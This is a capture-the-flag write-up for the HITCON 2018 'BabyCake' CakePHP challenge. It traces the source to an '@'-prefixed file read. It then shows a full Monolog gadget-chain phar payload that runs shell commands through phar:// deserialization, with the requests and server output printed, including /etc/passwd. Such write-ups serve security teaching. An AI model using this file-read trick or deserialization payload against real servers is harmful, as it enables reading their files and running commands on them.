# BabyCake
Credit: https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake

Download the source from challenge or [PDKT-Team](https://github.com/PDKT-Team/ctf/blob/master/hitcon2018/baby-cake/baby_cake.tgz).
![](https://i.imgur.com/PZKZJau.png)

The web is made with `Cake PHP`, version in `PHP 5`, seems a server which will request url for you if there's no cache in server.

Browse the demo page chal offer, you can find `<!-- from cache -->` which diff from other.

Let's grep the source, then you'll find the main logic in `src/Controller/PagesController.php`. (`<!-- from cache -->` in line 54 followed)

```php=
<?php

namespace App\Controller;
use Cake\Core\Configure;
use Cake\Http\Client;
use Cake\Http\Exception\ForbiddenException;
use Cake\Http\Exception\NotFoundException;
use Cake\View\Exception\MissingTemplateException;

class DymmyResponse {
    function __construct($headers, $body) {
        $this->headers = $headers;
        $this->body = $body;
    }
}

class PagesController extends AppController {

    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }

    private function back() {
        return $this->render('pages');
    }

    private function _cache_dir($key){
        $ip = $this->request->getEnv('REMOTE_ADDR');
        $index = sprintf('mycache/%s/%s/', $ip, $key);
        return CACHE . $index;
    }

    private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");
            
            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }

    public function display(...$path) {    
        $request  = $this->request;
        $data = $request->getQuery('data');
        $url  = $request->getQuery('url');
        if (strlen($url) == 0) 
            return $this->back();

        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );
        if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
            return $this->back();

        $method = strtolower( $request->getMethod() );
        if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
            return $this->back();


        $headers = [];
        foreach ($request->getHeaders() as $key => $value) {
            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                continue;
            if (count($value) == 0)
                continue;

            $headers[$key] = $value[0];
        }

        $key = md5($url);
        if ($method == 'get') {
            $response = $this->cache_get($key);
            if (!$response) {
                $response = $this->httpclient($method, $url, $headers, null);
                $this->cache_set($key, $response);                
            }
        } else {
            $response = $this->httpclient($method, $url, $headers, $data);
        }

        foreach ($response->headers as $key => $value) {
            if (strtolower($key) == 'content-type') {
                $this->response->type(array('type' => $value));
                $this->response->type('type');
                continue;
            }
            $this->response->withHeader($key, $value);
        }

        $this->response->body($response->body);
        return $this->response;
    }
}
```

First, this chal support `HTTP\HTTPS` two protocal, `GET\POST\PUT\DELETE\PATCH` five method.

In `display()`, if it receives `GET` method, `url` will be extracted from `$_GET['url']` and `MD5()` to match the cache if it already existed in server, if not then request one for client and store it as cache on server.

```php
if ($method == 'get') {
    $response = $this->cache_get($key);
    if (!$response) {
        $response = $this->httpclient($method, $url, $headers, null);
        $this->cache_set($key, $response);                
    }
} else {
    $response = $this->httpclient($method, $url, $headers, $data);
}
```

In this piece, you'll find `file_get_contents()` in `cache_get()` seems restricly to exploit, but `unserialize()` seems remain useful with special `header` payload.

Although we get some RCE vulnerability, we still need to get return feedback, that means parameter-checkless `file_get_contents()` will helpful.

If client send a new url request that is existed in cache, it will go straight into `httpclient($method, $url, $headers, null)`.

Back to top line 19:
```php
    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }
```
Here `$http = new Client();` point us to `vendor/cakephp/cakephp/src/Http/Client.php`(line 5) find the `$method($url, $data, $options)`.

Here's some thing important that seems `GET` will not remain `$data`, but `POST\PUT\DELETE\PATCH` will, so let's try out `POST`.

```php=
    public function post($url, $data = [], array $options = [])
    {
        $options = $this->_mergeOptions($options);
        $url = $this->buildUrl($url, [], $options);

        return $this->_doRequest(Request::METHOD_POST, $url, $data, $options);
    }

    ...
    
    protected function _doRequest($method, $url, $data, $options)
    {
        $request = $this->_createRequest(
            $method,
            $url,
            $data,
            $options
        );

        return $this->send($request, $options);
    }

    ...

    protected function _createRequest($method, $url, $data, $options)
    {
        $headers = isset($options['headers']) ? (array)$options['headers'] : [];
        if (isset($options['type'])) {
            $headers = array_merge($headers, $this->_typeHeaders($options['type']));
        }
        if (is_string($data) && !isset($headers['Content-Type']) && !isset($headers['content-type'])) {
            $headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

        $request = new Request($url, $method, $headers, $data);

        ...
        return $request;
    }
```

Here, client's `post($url, $data = [], array $options = [])` will passed to `_doRequest($method, $url, $data, $options)`(line 6) which will create a `$request` object using `_createRequest($method, $ url, $data, $options)`(line 13). 

In this function, the object is created as `Cake\Http\Client\Request` in `$request = new Request($url, $method, $headers, $data)`(line 35).

Next, we dig deeper into v`endor/cakephp/cakephp/src/Http/Client/Request.php` code.

```php=
    public function body($body = null)
    {
        if ($body === null) {
            $body = $this->getBody();

            return $body ? $body->__toString() : '';
        }
        if (is_array($body)) {
            $formData = new FormData();
            $formData->addMany($body);
            $this->header('Content-Type', $formData->contentType());
            $body = (string)$formData;
        }
        $stream = new Stream('php://memory', 'rw');
        $stream->write($body);
        $this->stream = $stream;

        return $this;
    }
```

In the `body($body)` function, if `$body` is an array(line 8), then the data will be processed using `Cake\Http\FormData` with the call to `addMany(array $array)` function(line 10). 

Let's see `vendor/cakephp/cakephp/src/Http/Client/FormData.php`.

```php=
    public function add($name, $value = null)
    {
        if (is_array($value)) {
            $this->addRecursive($name, $value);
        } elseif (is_resource($value)) {
            $this->addFile($name, $value);
        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
            trigger_error(
                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                'Instead you should use file handles.',
                E_USER_DEPRECATED
            );
            $this->addFile($name, $value);
        } elseif ($name instanceof FormDataPart && $value === null) {
            $this->_hasComplexPart = true;
            $this->_parts[] = $name;
        } else {
            $this->_parts[] = $this->newPart($name, $value);
        }

        return $this;
    }

    public function addMany(array $data)
    {
        foreach ($data as $name => $value) {
            $this->add($name, $value);
        }

        return $this;
    }

    public function addFile($name, $value)
    {
        $this->_hasFile = true;

        $filename = false;
        $contentType = 'application/octet-stream';
        if (is_resource($value)) {
            $content = stream_get_contents($value);
            if (stream_is_local($value)) {
                $finfo = new finfo(FILEINFO_MIME);
                $metadata = stream_get_meta_data($value);
                $contentType = $finfo->file($metadata['uri']);
                $filename = basename($metadata['uri']);
            }
        } else {
            $finfo = new finfo(FILEINFO_MIME);
            $value = substr($value, 1);
            $filename = basename($value);
            $content = file_get_contents($value);
            $contentType = $finfo->file($value);
        }
        $part = $this->newPart($name, $content);
        $part->type($contentType);
        if ($filename) {
            $part->filename($filename);
        }
        $this->add($part);

        return $part;
    }
```

Execution in the `addMany(array $data)` function will call `add($name, $value)` for each item in array(line 26). 

In the `add($name, $value)` function, if `$value` is a string that starts with `@` (line 7), then `addFile($name, $value)` will be called.

In `addFile($name, $value)`, because `$value` is not a web page stream, so false `is_resource()`, then `$value = substr($value, 1);` and `$content = file_get_contents($value);` will be executed. 

With this, since `$value` is tainted from `getQuery('data')` in `src/Controller/PagesController.php/display()`.

We can control the parameter of `file_get_contents()`, a SSRF here.

```
POST http://13.230.134.135/?url=http://IP&data[test]=@/flag
```

**Failed** :(

```
POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
orange:x:1001:1001:,,,:/home/orange:/bin/bash
```

OK. This means there might be another way to read the `flag`, probably a `read_flag` binary in special anth.

Let's back to `phar://` protocal `unserialize()` RCE vulnerabilty in `src/Controller/PagesController.php`.

Let's locate our location:
```
POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/apache2/sites-enabled/000-default.conf
```

```
<VirtualHost *:80>
	...
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	...
</VirtualHost>
```
Location: `/var/www/html`, target `.phar` might be in `/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/xxz.phar)/body.cache`.

Then our `unserialize()` RCE attack flow might be:
1. Construct payload.
1. Put paylaod into a `.phar` on attacker's own server.
1. Use target server's own service to access attacker's `payload.phar`, then this `.phar` will be written into target server's cache: `/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/xxz.phar)/body.cache`
1. Use `POST` method to trigger payload.

We can use [https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php) to construct a payload or use payload from PDKT-Team:
```
<?php

namespace Monolog\Handler
{
    class SyslogUdpHandler
    {
        protected $socket;
        function __construct($x)
        {
            $this->socket = $x;
        }
    }
    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;
        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }
}

namespace{
    $cmd = "ls -alt";

    $obj = new \Monolog\Handler\SyslogUdpHandler(
        new \Monolog\Handler\BufferHandler(
            ['current', 'system'],
            [$cmd, 'level' => null]
        )
    );

    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test', 'test');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($obj);
    $phar->stopBuffering();

}
```

Put this payload on your own server, the use `GET` request to load this into target's cache:
```
GET http://13.230.134.135/?url=http://IP/exploit.phar
```

Then use `POST` 
```
POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache
```

Well, with `$cmd = "ls -alt"` won't get result back.

You should use `$cmd = "ls -al / > /tmp/ls.txt"` with SSRF we found with `file_get_contents()` to take result back:
```
total 104
drwxr-xr-x  26 root root  1000 Oct 21 11:08 run
drwxrwxrwt   2 root root  4096 Oct 21 06:25 tmp
-rwsr-sr-x   1 root root  8568 Oct 18 19:53 read_flag
drwxr-xr-x  23 root root  4096 Oct 18 19:53 .
drwxr-xr-x  23 root root  4096 Oct 18 19:53 ..
drwx------   5 root root  4096 Oct 18 17:12 root
drwxr-xr-x  90 root root  4096 Oct 18 11:23 etc
dr-xr-xr-x  13 root root     0 Oct 16 07:57 sys
-r--------   1 root root    54 Oct 15 19:49 flag
drwxr-xr-x   4 root root  4096 Oct 15 19:41 home
drwxr-xr-x   3 root root  4096 Oct  9 06:07 boot
lrwxrwxrwx   1 root root    31 Oct  9 06:07 initrd.img -> boot/initrd.img-4.15.0-1023-aws
lrwxrwxrwx   1 root root    28 Oct  9 06:07 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
drwxr-xr-x   2 root root  4096 Oct  9 06:07 sbin
lrwxrwxrwx   1 root root    14 Oct  8 17:14 www -> /var/www/html/
drwxr-xr-x  14 root root  4096 Oct  8 17:13 var
drwxr-xr-x   5 root root  4096 Oct  8 17:06 snap
drwxr-xr-x  15 root root  2980 Oct  8 17:06 dev
dr-xr-xr-x 136 root root     0 Oct  8 17:06 proc
lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
drwxr-xr-x  20 root root  4096 Sep 12 16:16 lib
drwx------   2 root root 16384 Sep 12 16:10 lost+found
drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 sr
```

Obviously, execute the `read_flag` and print the result into temp file like: `$cmd = "./read_flag / > /tmp/ls.txt"` 

Flag= `hitcon{smart_implementation_of_CURLOPT_SAFE_UPLOAD><}`